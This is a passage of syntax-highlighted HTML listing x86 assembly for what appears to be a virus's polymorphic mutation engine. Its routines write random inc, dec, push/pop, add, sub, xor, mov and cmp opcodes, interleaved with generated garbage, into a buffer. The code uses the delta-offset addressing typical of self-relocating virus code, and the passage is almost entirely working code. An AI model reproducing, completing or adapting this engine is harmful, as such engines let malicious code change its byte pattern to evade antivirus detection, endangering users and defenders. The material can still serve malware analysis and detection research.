</span><span class="sc5">geninc</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;40</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">geninc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">genincdec</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoinc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoinc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">genincdec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">;inc</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                            </span><span class="sc1">;dec</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random dec</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gendec</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;48</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gendec</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gendecinc</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetodec</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetodec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">gendecinc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Pushes register in al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">pushregister</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;set flag for reg.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Pops register in al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">popregister</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;unflag for reg.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg, value or add reg1,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">addregreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomaddvalue</span><span class="sc0">

</span><span class="sc5">rndaddb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">addregreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomaddreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndaddb</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg,value - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;           81 c0+reg value</span><span class="sc0">
</span><span class="sc1">; reg = eax 05 value</span><span class="sc0">

</span><span class="sc5">randomaddvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                   </span><span class="sc1">;reg = eax?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">addeax</span><span class="sc0">                                  </span><span class="sc1">;special</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">backfromaddeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">addeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backfromaddeax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg1,reg2 - reg1 = al </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomaddreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg, value or sub reg1,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomsub</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">subregreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsubvalue</span><span class="sc0">

</span><span class="sc5">rndsubb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subregreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsubreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndsubb</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg,value - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;           81 c0+reg value</span><span class="sc0">
</span><span class="sc1">; reg = eax 05 value</span><span class="sc0">

</span><span class="sc5">randomsubvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                   </span><span class="sc1">;reg = eax?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">subeax</span><span class="sc0">                                  </span><span class="sc1">;special</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">backfromsubeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backfromsubeax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg1,reg2 - reg1 = al </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomsubreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a xor reg, value or xor reg, reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxor</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">xorvalue</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxorreg</span><span class="sc0">

</span><span class="sc5">rndxorr</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xorvalue</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxorvalue</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndxorr</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random xor reg,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxorreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;6633</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random xor reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxorvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random mov reg,value or reg,reg2</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">movreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommovvalue</span><span class="sc0">

</span><span class="sc5">movback</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">movreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommovreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">movback</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random mov reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommovvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random mov reg,reg2</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randommovreg</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;8b (c0+reg) or reg2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       generates a random cmp reg,reg2 or cmp reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gencmp</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;39/3b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">gencmp</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gencmpvalue</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gencmp1</span><span class="sc0">
